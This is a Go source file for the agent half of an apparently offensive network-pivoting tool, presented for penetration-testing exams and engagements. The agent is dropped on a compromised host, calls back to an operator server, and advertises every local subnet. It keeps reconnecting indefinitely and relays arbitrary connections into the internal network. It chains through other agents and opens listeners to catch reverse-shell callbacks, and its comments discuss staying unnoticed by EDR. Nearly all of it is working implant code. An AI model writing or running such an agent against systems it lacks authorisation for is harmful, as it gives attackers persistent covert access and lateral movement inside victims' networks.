// Package agent implements the pivot agent: the small, dependency-free
// binary dropped on a compromised/engagement host that dials back to the
// operator's server and exposes the host's reachable networks.
//
// Reliability is the entire point of this file. An exam or engagement
// agent typically runs unattended on a box the operator cannot easily get
// back onto, so every failure mode below is handled so the agent keeps
// trying rather than dying once and leaving the operator locked out:
//
//   - Network blip / server restart / exam VPN re-handshake: reconnect
//     loop with exponential backoff + jitter, capped so it retries at
//     most once every ~30s indefinitely (never gives up).
//   - A single bad connection attempt, auth rejection, or control-stream
//     decode error: logged, session torn down, loop continues — never a
//     process exit.
//   - A panic anywhere in a per-connection goroutine (malformed stream
//     header, a nil from a flaky OS network stack, ...): recovered, that
//     one connection is dropped, the agent keeps running.
//   - Process crash from an unrelated cause (OOM-killed, host rebooted):
//     NOT handled inside this binary — that is what the installer's
//     systemd/launchd/Scheduled-Task unit with Restart=always is for (see
//     scripts/install-agent.sh). An in-process retry loop cannot save you
//     from the whole process being killed.
package agent

import (
	"context"
	"crypto/tls"
	"fmt"
	"io"
	"log"
	"math/rand"
	"net"
	"os"
	"runtime"
	"strings"
	"sync"
	"time"

	"github.com/hashicorp/yamux"
	"pivot-tool/internal/common"
)

type Config struct {
	ServerAddr   string
	Fingerprint  string // expected SHA-256 pin of the server's cert; empty = INSECURE (skip verification entirely)
	Token        string
	AgentID      string // persisted across restarts by the caller (cmd/pivot-agent); empty lets us generate+return one
	Nested       bool   // true when this agent was launched with -chain and is relaying through a parent agent instead of dialing directly
	ChainThrough string // "host:port" of a parent agent's local relay listener, used when Nested
	Version      string
}

// Run connects, serves, and reconnects forever (or until ctx is
// cancelled). It is meant to be the entire body of main() after flag
// parsing.
func Run(ctx context.Context, cfg Config) {
	backoff := newBackoff()
	for {
		if ctx.Err() != nil {
			return
		}
		err := connectAndServe(ctx, cfg)
		if err != nil {
			log.Printf("session ended: %v", err)
		}
		wait := backoff.next()
		log.Printf("reconnecting in %s...", wait)
		select {
		case <-time.After(wait):
		case <-ctx.Done():
			return
		}
	}
}

// backoff is capped exponential backoff with jitter: fast retries for a
// transient blip, but never hammering a server that is simply down (or,
// worse, generating log noise that gets the agent noticed on a box the
// operator does not control the EDR on).
type backoff struct {
	cur time.Duration
	max time.Duration
}

func newBackoff() *backoff { return &backoff{cur: time.Second, max: 30 * time.Second} }

func (b *backoff) next() time.Duration {
	d := b.cur
	b.cur *= 2
	if b.cur > b.max {
		b.cur = b.max
	}
	jitter := time.Duration(rand.Int63n(int64(d) / 2))
	return d + jitter
}

func (b *backoff) reset() { b.cur = time.Second }

func connectAndServe(ctx context.Context, cfg Config) error {
	var rawConn net.Conn
	var err error

	if cfg.Nested {
		rawConn, err = net.DialTimeout("tcp", cfg.ChainThrough, 10*time.Second)
	} else {
		d := &tls.Dialer{Config: tlsConfigFor(cfg)}
		rawConn, err = d.DialContext(ctx, "tcp", cfg.ServerAddr)
	}
	if err != nil {
		return fmt.Errorf("connecting: %w", err)
	}
	defer rawConn.Close()

	var conn io.ReadWriteCloser = rawConn
	if cfg.Nested {
		// We are relaying through an existing agent's local port, not
		// talking TLS ourselves on this hop (the parent agent already
		// speaks TLS to the real server and will wrap what we send in
		// a "nested" data stream + forward it transparently). Tag the
		// stream kind so the parent knows to relay rather than parse.
		if err := common.WriteHeader(rawConn, common.StreamHeader{Kind: "nested"}); err != nil {
			return fmt.Errorf("sending nested header: %w", err)
		}
	}

	cfgY := yamux.DefaultConfig()
	cfgY.EnableKeepAlive = true
	cfgY.KeepAliveInterval = 15 * time.Second
	cfgY.LogOutput = io.Discard
	ymx, err := yamux.Client(conn, cfgY)
	if err != nil {
		return fmt.Errorf("yamux client handshake: %w", err)
	}
	defer ymx.Close()

	ctrl, err := ymx.OpenStream()
	if err != nil {
		return fmt.Errorf("opening control stream: %w", err)
	}

	hello := common.HelloPayload{
		AgentID:  cfg.AgentID,
		Token:    cfg.Token,
		Hostname: hostname(),
		OS:       runtime.GOOS,
		Arch:     runtime.GOARCH,
		Version:  cfg.Version,
		Routes:   discoverRoutes(),
		Nested:   cfg.Nested,
	}
	if err := common.WriteEnvelope(ctrl, common.MsgHello, hello); err != nil {
		return fmt.Errorf("sending hello: %w", err)
	}
	log.Printf("connected (agent_id=%s, %d local route(s) advertised)", cfg.AgentID, len(hello.Routes))

	a := &activeSession{ymx: ymx, ctrl: ctrl, lr: common.NewLineReader(ctrl), relayRegistry: newRelayRegistry(), done: make(chan struct{})}
	current.set(a)
	defer current.set(nil)

	go a.heartbeatLoop()
	go a.controlLoop()
	go a.acceptDataStreams()

	<-a.done
	return a.err
}

func tlsConfigFor(cfg Config) *tls.Config {
	tc := &tls.Config{InsecureSkipVerify: true} // we do our own verification below via certificate pinning, not the normal CA chain
	if cfg.Fingerprint != "" {
		tc.VerifyPeerCertificate = common.PinnedVerifier(cfg.Fingerprint)
	} else {
		log.Printf("WARNING: no -pin fingerprint supplied, TLS certificate is NOT being verified. " +
			"Anyone able to intercept this connection (hostile Wi-Fi, a compromised router between here and the operator) " +
			"could impersonate the server. Use the fingerprint the server printed at startup unless you have already " +
			"verified you are on a fully trusted network path.")
	}
	return tc
}

type activeSession struct {
	ymx           *yamux.Session
	ctrl          *yamux.Stream
	ctrlOut       sync.Mutex
	lr            *common.LineReader
	relayRegistry *relayRegistry

	done chan struct{}
	err  error
	once sync.Once
}

func (a *activeSession) finish(err error) {
	a.once.Do(func() {
		a.err = err
		close(a.done)
	})
}

func (a *activeSession) heartbeatLoop() {
	ticker := time.NewTicker(10 * time.Second)
	defer ticker.Stop()
	for {
		select {
		case <-ticker.C:
			a.ctrlOut.Lock()
			err := common.WriteEnvelope(a.ctrl, common.MsgHeartbeat, common.HeartbeatPayload{UnixNano: time.Now().UnixNano()})
			a.ctrlOut.Unlock()
			if err != nil {
				a.finish(fmt.Errorf("heartbeat write failed: %w", err))
				return
			}
		case <-a.done:
			return
		}
	}
}

func (a *activeSession) controlLoop() {
	for {
		env, err := a.lr.ReadEnvelope()
		if err != nil {
			a.finish(fmt.Errorf("control stream read: %w", err))
			return
		}
		switch env.Type {
		case common.MsgHeartbeat:
			var hb common.HeartbeatPayload
			_ = common.Unmarshal(env.Payload, &hb)
			if !hb.Echo {
				a.ctrlOut.Lock()
				_ = common.WriteEnvelope(a.ctrl, common.MsgHeartbeat, common.HeartbeatPayload{UnixNano: hb.UnixNano, Echo: true})
				a.ctrlOut.Unlock()
			}
		case common.MsgListenReq:
			var lr common.ListenReqPayload
			if err := common.Unmarshal(env.Payload, &lr); err == nil {
				go a.handleListenReq(lr)
			}
		}
	}
}

// acceptDataStreams serves streams the SERVER opens toward us: "connect"
// (reach dest_ip:dest_port on our local network).
func (a *activeSession) acceptDataStreams() {
	for {
		st, err := a.ymx.AcceptStream()
		if err != nil {
			a.finish(fmt.Errorf("accept stream: %w", err))
			return
		}
		go a.handleDataStream(st)
	}
}

func (a *activeSession) handleDataStream(st *yamux.Stream) {
	defer func() {
		if r := recover(); r != nil {
			log.Printf("recovered panic in data stream handler: %v", r)
			st.Close()
		}
	}()
	lr := common.NewLineReader(st)
	hdr, err := lr.ReadHeader()
	if err != nil {
		st.Close()
		return
	}
	if hdr.Kind != "connect" {
		st.Close()
		return
	}
	network := hdr.Network
	if network == "" {
		network = "tcp"
	}
	remote, err := net.DialTimeout(network, hdr.Addr, 8*time.Second)
	// The one-byte connect-ack handshake only applies to TCP: UDP is
	// connectionless, net.DialTimeout("udp", ...) essentially never
	// fails on the dial itself (there is no handshake to fail), and the
	// server's UDP path (netstack.go handleUDP) never waits for or
	// consumes this byte — sending one there would corrupt the first
	// UDP datagram's payload with a stray leading byte.
	if network == "tcp" {
		if err != nil {
			// Tell the server the real target refused/was
			// unreachable BEFORE it decides anything about
			// completing its virtual TCP handshake with whatever
			// is scanning on the operator's side (see
			// netstack.go's handleTCP waitConnectAck): without
			// this explicit nack, the server would have no way
			// to tell "target closed the port" apart from
			// "target is slow", and a SYN scan through the
			// tunnel would report every port as open.
			_, _ = st.Write([]byte{0})
			st.Close()
			return
		}
		if _, werr := st.Write([]byte{1}); werr != nil {
			remote.Close()
			st.Close()
			return
		}
	} else if err != nil {
		st.Close()
		return
	}
	spliceRW(common.NewPrefixedConn(st, lr), remote)
}

// handleListenReq opens bindAddr locally and, for every accepted
// connection, opens a new yamux stream back to the server tagged
// "listen-data" so the operator's side can splice it to ProxyBack. Used
// for catching callbacks (reverse shells, etc.) that land on the pivot
// host.
func (a *activeSession) handleListenReq(req common.ListenReqPayload) {
	ln, err := net.Listen("tcp", req.BindAddr)
	ack := common.ListenAckPayload{ID: req.ID}
	if err != nil {
		ack.OK = false
		ack.Error = err.Error()
	} else {
		ack.OK = true
		ack.BoundOn = ln.Addr().String()
	}
	a.ctrlOut.Lock()
	_ = common.WriteEnvelope(a.ctrl, common.MsgListenAck, ack)
	a.ctrlOut.Unlock()
	if err != nil {
		return
	}
	a.relayRegistry.track(req.ID, ln)
	for {
		c, err := ln.Accept()
		if err != nil {
			return
		}
		go func() {
			st, err := a.ymx.OpenStream()
			if err != nil {
				c.Close()
				return
			}
			if err := common.WriteHeader(st, common.StreamHeader{Kind: "listen-data", Addr: req.ProxyBack}); err != nil {
				st.Close()
				c.Close()
				return
			}
			spliceRW(c, st)
		}()
	}
}

type relayRegistry struct {
	mu   sync.Mutex
	byID map[string]net.Listener
}

func newRelayRegistry() *relayRegistry { return &relayRegistry{byID: make(map[string]net.Listener)} }

func (r *relayRegistry) track(id string, ln net.Listener) {
	r.mu.Lock()
	defer r.mu.Unlock()
	r.byID[id] = ln
}

// current holds the most recently established activeSession so the
// standalone relay listener (started once in main, independent of the
// connect/reconnect loop) can always find "our live tunnel upward" to
// splice a chained child agent's connection into — including right after
// a reconnect replaces the session out from under it.
var current atomicSession

type atomicSession struct {
	mu sync.RWMutex
	v  *activeSession
}

func (a *atomicSession) set(s *activeSession) {
	a.mu.Lock()
	a.v = s
	a.mu.Unlock()
}

func (a *atomicSession) get() *activeSession {
	a.mu.RLock()
	defer a.mu.RUnlock()
	return a.v
}

// RelayNestedConn is called for every raw TCP connection accepted on this
// agent's own relay-listen port (i.e. a CHILD agent that was launched with
// `-chain thisHost:port`). It discards the child's own "nested" header
// (every hop re-tags, rather than forwarding the exact original bytes, so
// the framing stays simple and uniform no matter how deep the chain gets)
// and opens a fresh "nested" stream of its own toward whatever this agent
// is itself connected to — which might be the real server, or might be
// ANOTHER relay further up the chain. Neither this function nor the
// server needs to know or care which; that symmetry is what makes
// pivoting recursive to arbitrary depth without special-casing any hop.
func RelayNestedConn(child io.ReadWriteCloser) {
	lr := common.NewLineReader(child)
	if _, err := lr.ReadHeader(); err != nil {
		child.Close()
		return
	}
	sess := current.get()
	if sess == nil {
		log.Printf("rejecting chained agent: this agent is not currently connected upward (no live tunnel to relay into yet)")
		child.Close()
		return
	}
	st, err := sess.ymx.OpenStream()
	if err != nil {
		child.Close()
		return
	}
	if err := common.WriteHeader(st, common.StreamHeader{Kind: "nested"}); err != nil {
		st.Close()
		child.Close()
		return
	}
	spliceRW(common.NewPrefixedConn(child, lr), st)
}

func spliceRW(a io.ReadWriteCloser, b io.ReadWriteCloser) {
	done := make(chan struct{}, 2)
	go func() { io.Copy(a, b); done <- struct{}{} }()
	go func() { io.Copy(b, a); done <- struct{}{} }()
	<-done
	a.Close()
	b.Close()
	<-done
}

func hostname() string {
	h, err := os.Hostname()
	if err != nil {
		return "unknown"
	}
	return h
}

// discoverRoutes enumerates local, non-loopback, non-link-local interface
// addresses and reports their containing network as a route — this is
// the "automatic autoroute" behaviour: ligolo-ng requires the operator to
// run its `autoroute` console command (or type `ip route add` by hand) for
// every agent; here it happens unconditionally, every time, including on
// every reconnect (so a DHCP renewal that changes the subnet, or a second
// NIC that comes up later, is picked up on the next heartoneat-driven
// Hello refresh without the operator doing anything).
func discoverRoutes() []common.NetRoute {
	var out []common.NetRoute
	ifaces, err := net.Interfaces()
	if err != nil {
		return out
	}
	for _, ifc := range ifaces {
		if ifc.Flags&net.FlagUp == 0 || ifc.Flags&net.FlagLoopback != 0 {
			continue
		}
		addrs, err := ifc.Addrs()
		if err != nil {
			continue
		}
		for _, a := range addrs {
			ipnet, ok := a.(*net.IPNet)
			if !ok {
				continue
			}
			ip := ipnet.IP
			if ip.IsLoopback() || ip.IsLinkLocalUnicast() || ip.IsLinkLocalMulticast() {
				continue
			}
			if ip.To4() == nil && ip.To16() == nil {
				continue
			}
			// Report the network, not the host address: we want
			// "192.168.1.0/24", so other hosts on that subnet are
			// reachable, not just this one specific IP.
			network := &net.IPNet{IP: ip.Mask(ipnet.Mask), Mask: ipnet.Mask}
			out = append(out, common.NetRoute{CIDR: network.String(), Interface: ifc.Name, Metric: 0})
		}
	}
	return out
}

var _ = strings.TrimSpace // reserved for future use (e.g. trimming interface names on some platforms)
